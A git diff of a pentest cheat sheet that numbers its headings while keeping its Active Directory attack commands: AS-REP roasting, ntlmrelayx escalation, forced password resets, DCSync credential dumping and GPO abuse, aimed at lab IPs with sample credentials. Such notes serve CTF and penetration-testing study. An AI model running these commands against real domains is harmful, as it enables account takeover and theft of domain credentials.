@@ -3,7 +3,7 @@
 Different domain users, have different rights. Some domain users have GenericAll, GenericWrite, WriteDacl, WriteOwner privilege on other domain users or groups. We can abuse these privileges and move further in domain.
 
 
-### Abusing GenericAll Privilege
+### 1. Abusing GenericAll Privilege
 
 eg: (john have GenericAll priv on Exchange Windows Permissions group)
 
@@ -32,7 +32,7 @@ Set-DomainObject -Identity adams -XOR @{UserAccountControl=4194304}
 .\Rubeus.exe asreproast /user:jadams /nowrap
 ```
 
-### Abusing GenericWrite Perm on a User
+### 2. Abusing GenericWrite Perm on a User
 Here lily is the user on which we have generic write perm we can set this user to PreAuth and then by using [AS-REP Roasting](https://k4sth4.github.io/Kerberos/) we can get the user hash and crack it and login into system.
 ```markdown
 Set-ADAccountControl -Identity manager -DoesNotRequirePreAuth $true
@@ -40,7 +40,7 @@ Set-ADAccountControl -Identity manager -DoesNotRequirePreAuth $true
 Now we can do [AS-REP Roasting](https://k4sth4.github.io/Kerberos/).
 
 
-### Abusing WriteDacl Priv on any Group
+### 3. Abusing WriteDacl Priv on any Group
 eg: claire has WriteDacl rights on the Backup_Admins group. We can add it to Backup_Admins group.
 ```markdown
 net group backup_admins
@@ -48,7 +48,7 @@ net group backup_admins claire /add
 ```
 NOTE: Open another shell if changes are not reflected.
 
-### Abusing WriteDacl Priv On Domain by grant yourself the DcSync privileges
+### 4. Abusing WriteDacl Priv On Domain by grant yourself the DcSync privileges
 dan (user) has WriteDacl Perm on DC.
 
 using [Impacket](https://github.com/SecureAuthCorp/impacket) tool:
@@ -59,7 +59,7 @@ ntlmrelayx.py -t ldap://10.129.95.210 --escalate-user dan
 
 nevigate to http://127.0.0.1  and enter the user (dan & pass) now wait till it ask for you to run secretsdump.py on creds
 
-### Abusing WriteOwner Privilege
+### 5. Abusing WriteOwner Privilege
 We're tom user and getting ownership of claire and then change passwd of claire. Import [Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).
 ```markdown
 Set-DomainObjectOwner -identity claire -OwnerIdentity tom
@@ -68,7 +68,7 @@ $cred = ConvertTo-SecureString "qwer1234QWER!@#$" -AsPlainText -force
 Set-DomainUserPassword -identity claire -accountpassword $cred
 ```
 
-### Abusing DNS Admin wrights
+### 6. Abusing DNS Admin wrights
 This way is just for CTFs, in real world this will gonna break the DNS service.
 
 Step1. create a revshell via msfvenom
@@ -87,7 +87,7 @@ sc.exe start dns
 ```
 You will get a reverse shell.
 
-### Abusing ForceChange Password from linux os
+### 7. Abusing ForceChange Password from linux os
 login as support user and audit2020 is the user whose passwd gonna change.
 ```markdown
 rpcclient -U support 10.129.1.243 
@@ -95,13 +95,13 @@ setuserinfo2 audit2020 23 'Passw0rd!'
 ```
 
 
-### DcSync Attack
+### 8. DcSync Attack
 mrlky has Get-Changes privilege on the domain.
 ```markdown
 secretsdump.py -just-dc mrlky:Football@10.10.10.103
 ```
 
-### Abuse GPO Policy 
+### 9. Abuse GPO Policy 
 upload [SharpGPOAbuse.exe](https://github.com/FSecureLABS/SharpGPOAbuse)
 ```markdown
 .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount hackzzdogs --GPOName "DCPolicy"
